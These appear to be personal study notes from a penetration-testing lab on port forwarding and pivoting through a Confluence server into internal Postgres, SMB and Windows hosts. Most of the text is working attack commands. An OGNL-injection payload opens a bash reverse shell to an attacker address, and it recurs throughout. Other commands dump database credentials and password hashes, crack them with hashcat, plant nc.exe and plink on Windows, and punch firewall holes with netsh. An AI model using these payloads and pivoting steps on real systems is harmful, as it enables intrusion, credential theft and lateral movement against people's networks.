### Port forwarding
- pg db on 10.4.234.215
- confluence box is on DMZ, access to both kali and internal subnet, db is internal
- exploit vuln to get reverse shell on confluence - 192.168.234.63
```
curl -v http://192.168.234.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.181/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

decoded payload we are using (java OGNL)
```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/192.168.45.181/4444 0>&1').start()")}/
```

once on the box, enumerate networking
`ip addr`

check routes
`ip route`

find config file
`cat /var/atlassian/application-data/confluence/confluence.cfg.xml`

obtain plaintext creds, however network segmentation means we can't connect to it
```
jdbc:postgresql://10.4.234.215:5432/confluence
username: postgres
password: D@t4basePassw0rd!
```

- since there is no firewall, we can bind ports on WAN interface
- then forward all ports to pgdb inside the internal subnet
- we can use socat to do this
- once we setup port forward, commands from kali will be like hitting pg directly
- socat maybe installed by https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

on confluence
```
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.234.215:5432
```

from kali - pw D@t4basePassw0rd!
`psql -h 192.168.234.63 -p 2345 -U postgres`

on database
```
\l
\c confluence
select * from cwd_user;
```

copy hashes into file on kali (mode number for Atlassian (PBKDF2-HMAC-SHA1) hashes is 12001)
```
hashcat -m 12001 confluence-hashes /usr/share/wordlists/fasttrack.txt
```

lets try to use some of these passwords with ssh (database_admin, sqlpass123)
```
socat TCP-LISTEN:2222,fork TCP:10.4.234.215:22
```

from kali
`ssh database_admin@192.168.234.63 -p2222`

### SSH Tunneling
connect to confluence
```
curl -v http://192.168.234.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.181/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

ssh from confluence to pg, first check for tty functionality
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh database_admin@10.4.234.215
```

once connected to pg, we can enumerate the network
```
ip addr # discover network interfaces
ip route # discover subnets in routing table
```

in absence of other tools, do port sweep for 445
`for i in $(seq 1 254); do nc -zv -w 1 172.16.234.$i 445; done`

### set up local port forward to transfer smb info to kali
- use OpenSSH's -L option, which takes two sockets (in the format IPADDRESS:PORT) separated with a colon as an argument (e.g. IPADDRESS:PORT:IPADDRESS:PORT). The first socket is the listening socket that will be bound to the SSH client machine. The
- second socket is where we want to forward the packets to
- from confluence host - forward packets through the db ssh tunnel to the smb host
- note that -N means you only get output related to the port forward
`ssh -N -L 0.0.0.0:4455:172.16.234.217:445 database_admin@10.4.234.215`

now we need a second reverse shell on confluence
```
curl -v http://192.168.234.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.181/9999%200%3E%261%27%29.start%28%29%22%29%7D/
nc -nvlp 9999
```

need to confirm our port forward
`ss -ntplu`

and interact with smb from kali
`smbclient -p 4455 -L //192.168.234.63/ -U hr_admin --password=Welcome1234`

after listing, lets open smb shell
```
smbclient -p 4455 //192.168.234.63/scripts -U hr_admin --password=Welcome1234
ls
get Provisioning.ps1
```
### VM2
- step one get reverse shell on confluence
```
curl -v http://192.168.234.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.181/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```
`nc -nvlp 4444`
- step two set up local port forward via pg ssh tunnel (sqlpass123)
- obtain tty functionality first or it won't work
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -L 0.0.0.0:4455:172.16.234.217:4242 database_admin@10.4.234.215
```

download client
```
find . -name 'client_source*' 2> /dev/null
curl http://192.168.234.63:8090/exercises/ssh_local_client -o ssh_local_client
./ssh_local_client -i 192.168.234.63 -p 4455
```

### Dynamic port forwarding
use socks protocol to access multiple ports from one ssh tunnel
```
curl -v http://192.168.234.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.181/4444%200%3E%261%27%29.start%28%29%22%29%7D/
nc -nvlp 4444
```

use ssh to create ssh tunnel (-D = dynamic)
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn(["env","TERM=xterm-256color","/bin/bash","--rcfile", "/etc/bash.bashrc","-i"])'
ssh -N -D 0.0.0.0:9999 database_admin@10.4.234.215
```

connecto to HRSHARES on 445 via socks proxy
- need proxychains to use socks proxy with smbclient
- Proxychains is a tool that can force network traffic from third party tools over HTTP or SOCKS proxies. 
- As the name suggests, it can also be configured to push traffic over a chain of concurrent proxies.
- works for most dynamically-linked binaries that perform simple network operations. It won't work on statically-linked binaries.
```
tail /etc/proxychains4.conf
socks5 192.168.234.63 9999
```

with config file edited we can preprend the command to our smb command
`proxychains smbclient -L //172.16.234.217/ -U hr_admin --password=Welcome1234`

use nmap TCP-connect scan (-sT), skip DNS resolution (-n), skip the host discovery stage (-Pn) and only check the top 20 ports (--top-ports=20)
```
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.234.217
proxychains nmap -vvv -sT -p4800-4900 -Pn 172.16.234.217
```

```
curl http://192.168.234.63:8090/exercises/ssh_dynamic_client -o ssh_dynamic_client
proxychains ./ssh_dynamic_client -i 172.16.234.217 -p 4872
proxychains nc 172.16.234.217 4872
proxychains nmap -vvv -sT -p4872 -Pn 172.16.234.217
```


Remote port forwarding - bind listening port on kali instead of on a target machine (like reverse shell for port forwarding)
- you would do this if you are not able to open up listening port on the target due to firewall
- if it has an ssh client, we can set up an ssh server on kali 

on kali
```
sudo systemctl start ssh
sudo ss -ntplu
```

on client
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- listening socket first, forwarding socket second
- listen on 2345 on kali, and forward to second target
`ssh -N -R 127.0.0.1:2345:10.4.234.215:5432 kali@192.168.45.181`

```
# D@t4basePassw0rd!
psql -h 127.0.0.1 -p 2345 -U postgres
```

### VM 2
```
curl -v http://192.168.234.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.181/9999%200%3E%261%27%29.start%28%29%22%29%7D/
curl http://192.168.234.63:8090/exercises/ssh_remote_client -o ssh_remote_client
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
ssh -N -R 127.0.0.1:4444:10.4.234.215:4444 kali@192.168.45.181
```

### remote dynamic port forwarding
- use instaed of remote local port forwarding if you need more than one socket per connection (like for enumeration)
- to do this you need the SOCKS proxy
```
curl -v http://192.168.234.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.181/9999%200%3E%261%27%29.start%28%29%22%29%7D/
python3 -c 'import pty; pty.spawn("/bin/sh")'
sudo systemctl start ssh
sudo ss -ntplu
ssh -N -R 9998 kali@192.168.45.181
```

edit proxychains conf
`sudo vi /etc/proxychains4.conf #(socks5 127.0.0.1 9998)`

need to use internal interface
```
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.234.64
curl http://192.168.234.63:8090/exercises/ssh_remote_dynamic_client -o ssh_remote_dynamic_client
proxychains ./ssh_remote_dynamic_client -i 10.4.234.64 -p 9062
```
### using sshuttle
- basically turns ssh connection into something like a VPN, requires root priv on ssh client
```
curl -v http://192.168.195.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.181/9999%200%3E%261%27%29.start%28%29%22%29%7D/
```

from client
`socat TCP-LISTEN:2222,fork TCP:10.4.195.215:22`

from kali - specify what we want to hit and what subnets we want to tunnel through
`sshuttle -r database_admin@192.168.195.63:2222 10.4.195.0/24 172.16.195.0/24`

in anotherm window
`smbclient -L //172.16.195.217/ -U hr_admin --password=Welcome1234`

### Port forwarding with windows tools
ssh.exe - part of windows (ssh needs to be above 7.6 to use it for remote dynamic port forwarding)
```
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.195.64 /w:1200 /h:700
sudo systemctl status ssh
```

from cmd windows
```
where ssh
ssh.exe -V
ssh -N -R 9998 kali@192.168.45.181
ssh -N -R 1080 kali@192.168.45.242
```

update /etc/proxychains4.conf to use the above socket
`socks5 127.0.0.1 9998`

D@t4basePassw0rd! - use proxychains to connect to internal target via our kali listener
```
proxychains psql -h 10.4.195.215 -U postgres
proxychains ./ssh_exe_exercise_client.bin -i 10.4.195.215
```

### plink (command line putty alternative to ssh)
- rarely gets flagged with antivirus software
- good when you don't have gui access but doesn't do remote dynamic port forwarding

serve up nc.exe to get reverse shell
```
sudo systemctl start apache2
find / -name nc.exe 2>/dev/null
sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```

in command input on webpage
`powershell wget -Uri http://192.168.45.181/nc.exe -OutFile C:\Windows\Temp\nc.exe`

now get plink downloaded onto the machine
```
find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
powershell wget -Uri http://192.168.45.181/plink.exe -OutFile C:\Windows\Temp\plink.exe
```

run plink
- pass the socket we want to open on kali, the RDP server port on the loopback interface of the target that we want to forward packets to
`C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.181`

if no tty
`cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7.`

confirm port 9833 is open and connect via rdp
```
ss -ntplu
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```


# port forwarding with netsh (firewall configuration tool already installed on windows)
# requires admin privileges

xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.195.64
# open up cmd.exe as administrator
# instruct netsh interface to add a portproxy rule from an IPv4 listener that is forwarded to an IPv4 port (v4tov4
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.195.64 connectport=22 connectaddress=10.4.195.215
# no output, but confirm that the port is listening, and the port forward is set up
netstat -anp TCP | find "2222"
netsh interface portproxy show all
# check from kali - this is being filtered by windows firewall
sudo nmap -sS 192.168.195.64 -Pn -n -p2222
# add hole to bypass the rule
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.195.64 localport=2222 action=allow
# now we can access next server - sqlpass123
ssh database_admin@192.168.194.64 -p2222

# VM 2
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.195.64

# tell netsh to add a port proxy rule from our target to another internal target
# listens on our target on 2222 and forwards to 4545 on the internal target
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.195.64 connectport=4545 connectaddress=10.4.195.215
netstat -anp TCP | find "2222"
netsh interface portproxy show all
sudo nmap -sS 192.168.195.64 -Pn -n -p2222

# if firewall is blocking, we need to add a rule to allow our connection
```
netsh advfirewall firewall add rule name="test" protocol=TCP dir=in localip=192.168.45.234 localport=2345 action=allow
./netsh_exercise_client.bin -i 192.168.195.64
./netsh_exercise_client.bin -i 192.168.195.64 -p 2222
```





